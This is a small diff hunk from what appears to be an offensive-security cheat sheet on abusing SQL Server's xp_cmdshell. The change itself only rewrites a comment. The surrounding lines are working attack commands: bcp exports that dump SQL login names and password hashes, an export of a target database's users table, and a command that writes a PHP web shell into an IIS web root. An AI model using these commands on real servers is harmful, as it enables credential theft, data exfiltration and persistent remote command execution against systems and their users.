@@ -75,7 +75,7 @@ EXEC xp_cmdshell 'bcp "SELECT name, password_hash FROM sys.sql_logins" queryout 
 -- Export specific database data
 EXEC xp_cmdshell 'bcp "SELECT * FROM targetdb.dbo.users" queryout "C:\temp\users.csv" -c -T -t","';
 
--- Using format file for custom output
+-- Write PHP shell (unquoted $_GET[cmd] avoids shell double-quote conflicts)
 EXEC xp_cmdshell 'bcp "SELECT ''<?php system($_GET[cmd]); ?>''" queryout "C:\inetpub\wwwroot\s.php" -c -T';
 ```
 
